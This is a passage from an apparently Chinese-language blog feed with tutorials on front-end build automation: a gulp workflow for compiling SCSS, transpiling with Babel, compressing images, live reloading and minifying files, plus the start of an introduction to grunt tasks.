string">'foo.min.css'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 文件转换流</span>  <span class="token keyword">const</span> transform <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transform</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    transform<span class="token punctuation">:</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> encoding<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 核心转换过程实现</span>      <span class="token comment" spellcheck="true">// chunk => 读取流中读取到的内容</span>      <span class="token keyword">const</span> input <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> output <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\s+/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\/\*.+?\*\//g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>      <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  read    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>transform<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 转换</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 写入</span>  <span class="token keyword">return</span> read<span class="token punctuation">}</span></code></pre><h3 id="利用gulp的API来简化"><a href="#利用gulp的API来简化" class="headerlink" title="利用gulp的API来简化"></a>利用gulp的API来简化</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> src<span class="token punctuation">,</span> dest <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span><span class="token keyword">const</span> cleanCss <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-clean-css'</span><span class="token punctuation">)</span><span class="token keyword">const</span> rename <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-rename'</span><span class="token punctuation">)</span>exports<span class="token punctuation">.</span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/*.css'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">cleanCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extname<span class="token punctuation">:</span> <span class="token string">'.min.css'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="构建实例"><a href="#构建实例" class="headerlink" title="构建实例"></a>构建实例</h2><p>现在有一个目录结构，如何实现构建</p><blockquote><p>── src<br>    ├── about.html<br>    ├── index.html<br>    ├── assets<br>        └── styles<br>            ├── demo.scss<br>            ├── main.scss<br>            ├── _icons.scss<br>            └── _variables.scss<br>        └── scripts<br>            ├── main.js<br>        └── images<br>            ├── logo.png<br>            ├── a.svg</p></blockquote><ul><li>需要在src的同级目录下创建dist目录，且保留src的目录结构</li><li>scss编译成css</li><li>利用 babel 将 es6 转成 es5</li><li>png，svg图片进行压缩要先</li><li>每次构建要先删除原有的dist</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// gulpfile.js</span><span class="token keyword">const</span> <span class="token punctuation">{</span> src<span class="token punctuation">,</span> dest<span class="token punctuation">,</span> parallel<span class="token punctuation">,</span> series <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span><span class="token keyword">const</span> sass <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-sass'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// cnpm install -D gulp-sass</span><span class="token keyword">const</span> babel <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-babel'</span><span class="token punctuation">)</span><span class="token keyword">const</span> swig <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-swig'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// html模板引擎 cnpm install -D gulp-swig </span><span class="token keyword">const</span> imagemin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-imagemin'</span><span class="token punctuation">)</span><span class="token keyword">const</span> del <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'del'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 删除功能的插件 cnpm install -D del</span><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 模板数据</span>    <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token keyword">const</span> clean <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'dist'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> style <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/assets/styles/*.scss'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'src'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// base 基准目录</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">sass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/assets/scripts/*.js'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'src'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">babel</span><span class="token punctuation">(</span><span class="token punctuation">{</span> presets<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@babel/preset-env'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//babel只是平台，需要安装</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                             <span class="token comment" spellcheck="true">// @babel/core 和 @babel/preset-env</span><span class="token punctuation">}</span>                <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/*.html, { base: '</span>src' <span class="token punctuation">}</span>）         <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">swig</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> image <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/assets/images/**'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'src'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>         <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">imagemin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// public目录的拷贝</span><span class="token keyword">const</span> extra <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'public/**'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'public'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> compile <span class="token operator">=</span> <span class="token function">parallel</span><span class="token punctuation">(</span>style<span class="token punctuation">,</span> script<span class="token punctuation">,</span> page<span class="token punctuation">,</span> image<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// compile只执行src的处理</span><span class="token keyword">const</span> build <span class="token operator">=</span> <span class="token function">series</span><span class="token punctuation">(</span>clean<span class="token punctuation">,</span> <span class="token function">parallel</span><span class="token punctuation">(</span>compile<span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 先删除</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  compile<span class="token punctuation">,</span>  build<span class="token punctuation">}</span></code></pre><h3 id="插件越来越多怎么办"><a href="#插件越来越多怎么办" class="headerlink" title="插件越来越多怎么办"></a>插件越来越多怎么办</h3><p><code>cnpm install -D gulp-load-plugins</code> 使用这个插件自动加载插件所有</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// gulpfile.js</span><span class="token keyword">const</span> loadPlugins <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-load-plugins'</span><span class="token punctuation">)</span><span class="token keyword">const</span> plugins <span class="token operator">=</span> <span class="token function">loadPlugins</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> style <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/assets/styles/*.scss'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'src'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token function">sass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 所有插件使用plugin.sass()去使用</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="怎么实现热更新"><a href="#怎么实现热更新" class="headerlink" title="怎么实现热更新"></a>怎么实现热更新</h2><ul><li>会自动打开浏览器</li><li>修改<code>dist</code>下的文件，页面会自动更新</li></ul><hr><p>安装<code>browser-sync</code>插件：<code>cnpm install -D browser-sync</code> </p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// gulpfile.js中增加以下内容</span><span class="token keyword">const</span> browserSync <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'browser-sync'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bs <span class="token operator">=</span> browserSync<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> serve <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  bs<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    notify<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    files<span class="token punctuation">:</span> <span class="token string">'dist/**'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 热更新文件</span>    port<span class="token punctuation">:</span> <span class="token number">2080</span><span class="token punctuation">,</span>    server<span class="token punctuation">:</span> <span class="token punctuation">{</span>      baseDir<span class="token punctuation">:</span> <span class="token string">'dist'</span>    <span class="token comment" spellcheck="true">// 基准目录</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  compile<span class="token punctuation">,</span>  build<span class="token punctuation">,</span>  serve  <span class="token punctuation">}</span></code></pre><h3 id="怎么实现修改src下面的文件，自动执行编译过程，再更新到页面"><a href="#怎么实现修改src下面的文件，自动执行编译过程，再更新到页面" class="headerlink" title="怎么实现修改src下面的文件，自动执行编译过程，再更新到页面"></a>怎么实现修改<code>src</code>下面的文件，自动执行编译过程，再更新到页面</h3><p>使用<code>watch</code>插件来监听，同时优化一下组合任务</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> src<span class="token punctuation">,</span> dest<span class="token punctuation">,</span> parallel<span class="token punctuation">,</span> series<span class="token punctuation">,</span> watch <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span><span class="token keyword">const</span> serve <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">watch</span><span class="token punctuation">(</span><span class="token string">'src/assets/styles/*.scss'</span><span class="token punctuation">,</span> style<span class="token punctuation">)</span>  <span class="token function">watch</span><span class="token punctuation">(</span><span class="token string">'src/assets/scripts/*.js'</span><span class="token punctuation">,</span> script<span class="token punctuation">)</span>  <span class="token function">watch</span><span class="token punctuation">(</span><span class="token string">'src/*.html'</span><span class="token punctuation">,</span> page<span class="token punctuation">)</span>  <span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string">'src/assets/images/**'</span><span class="token punctuation">,</span>    <span class="token string">'public/**'</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span> bs<span class="token punctuation">.</span>reload<span class="token punctuation">)</span>  bs<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    notify<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    files<span class="token punctuation">:</span> <span class="token string">'dist/**'</span><span class="token punctuation">,</span>    server<span class="token punctuation">:</span> <span class="token punctuation">{</span>      baseDir<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'dist'</span><span class="token punctuation">,</span> <span class="token string">'src'</span><span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// 起服务时按顺序找文件，dist找不到就找src,图片就在src中</span>      routes<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">'/node_modules'</span><span class="token punctuation">:</span> <span class="token string">'node_modules'</span> <span class="token comment" spellcheck="true">// html文件中</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 编译源文件到dist目录</span><span class="token keyword">const</span> compile <span class="token operator">=</span> <span class="token function">parallel</span><span class="token punctuation">(</span>style<span class="token punctuation">,</span> script<span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 上线之前执行的任务：包括对图片的压缩等只需执行一次的任务</span><span class="token keyword">const</span> build <span class="token operator">=</span> <span class="token function">series</span><span class="token punctuation">(</span>clean<span class="token punctuation">,</span> <span class="token function">parallel</span><span class="token punctuation">(</span>compile<span class="token punctuation">,</span> image<span class="token punctuation">,</span> extra<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 开发过程中的任务，先编译再起服务器</span><span class="token keyword">const</span> develop <span class="token operator">=</span> <span class="token function">series</span><span class="token punctuation">(</span>compile<span class="token punctuation">,</span> serve<span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  compile<span class="token punctuation">,</span>  build<span class="token punctuation">,</span>  serve<span class="token punctuation">,</span>  develop<span class="token punctuation">}</span></code></pre><p><strong>现在html文件中存在引用外部文件的方式</strong></p><pre class=" language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!-- build:css assets/styles/main.css --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>assets/styles/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- endbuild --></span>  <span class="token comment" spellcheck="true">&lt;!-- 处理成下面这种 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>assets/styles/vendor.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p><strong>需要安装<code>useref</code>插件：<code>cnpm install -D gulp-useref</code></strong>，在<code>gulpfile.js</code>中创建一个新任务</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> useref <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'dist/*.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'dist'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token function">useref</span><span class="token punctuation">(</span><span class="token punctuation">{</span> searchPath<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'dist'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'dist'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><p>安装<code>cnpm install -D gulp-htmlmin gulp-uglify gulp-clean-css</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> min <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'dist/**'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'dist'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex">/\.js$/</span><span class="token punctuation">,</span> plugins<span class="token punctuation">.</span><span class="token function">uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex">/\.css$/</span><span class="token punctuation">,</span> plugins<span class="token punctuation">.</span><span class="token function">cleanCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token regex">/\.html$/</span><span class="token punctuation">,</span> plugins<span class="token punctuation">.</span><span class="token function">htmlmin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      collapseWhitespace<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minifyCSS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minifyJS<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'release'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 如果写dist会有文件冲突</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 解决办法是把目前的dist改为temp，作为中间文件，最后再压缩到dist中</span></code></pre><h3 id="构建完成的处理"><a href="#构建完成的处理" class="headerlink" title="构建完成的处理"></a>构建完成的处理</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 选择需要导出的任务</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  build<span class="token punctuation">,</span>  develop<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 把他写在package.json中</span><span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"gulp build"</span><span class="token punctuation">,</span>    <span class="token string">"develop"</span><span class="token punctuation">:</span> <span class="token string">"gulp develop"</span><span class="token punctuation">}</span></code></pre><h3 id="封装工作流"><a href="#封装工作流" class="headerlink" title="封装工作流"></a>封装工作流</h3><p><strong>将构建过程封装，发布并使用模块，就不必在每个项目中单独去重复写<code>gulpfile.js</code></strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自动化构建与grunt</title>
      <link href="2020/08/31/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%84%E5%BB%BA%E4%B8%8Egrunt/"/>
      <url>2020/08/31/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%84%E5%BB%BA%E4%B8%8Egrunt/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是自动化构建"><a href="#什么是自动化构建" class="headerlink" title="什么是自动化构建"></a>什么是自动化构建</h2><p>比如在项目中需要通过<code>sass main.css</code>来编译css文件，不必要每次都使用命令行命令来编译。</p><p>可以用<code>npm scripts</code>来实现自动化构建，在<code>package.json</code>中书写</p><pre class=" language-json"><code class="language-json">// 类似与这种就是自动化构建 <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"webpack-dev-server --inline --progress --config build/webpack.dev.conf.js"</span><span class="token punctuation">,</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"npm run dev"</span><span class="token punctuation">,</span>    <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"node build/build.js"</span><span class="token punctuation">,</span>    <span class="token property">"lint"</span><span class="token operator">:</span> <span class="token string">"eslint --fix --ext .js,.vue src"</span><span class="token punctuation">,</span>    <span class="token property">"precommit"</span><span class="token operator">:</span> <span class="token string">"npm run lint"</span><span class="token punctuation">}</span></code></pre><h2 id="grunt"><a href="#grunt" class="headerlink" title="grunt"></a>grunt</h2><p>grunt是一款构建工具，在项目中使用<code>npm init</code>初始化一个<code>package.json</code>文件，然后使用<code>npm install grunt</code></p><p>安装，安装成功之后创建<code>gruntfile.js</code>作为入口文件，编写如下：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Grunt的入口文件</span><span class="token comment" spellcheck="true">// 需要导出一个函数，此函数接收一个 grunt 的形参</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> grunt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello grunt'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt foo</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello grunt bar'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt bar</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'default'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'default task'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'default'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt</span>  <span class="token comment" spellcheck="true">// 模拟异步任务</span>  grunt<span class="token punctuation">.</span><span class="token function">registerTask</span><span class="token punctuation">(</span><span class="token string">'async'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> done <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async task'</span><span class="token punctuation">)</span>      <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// grunt async</span>  <span class="token comment" 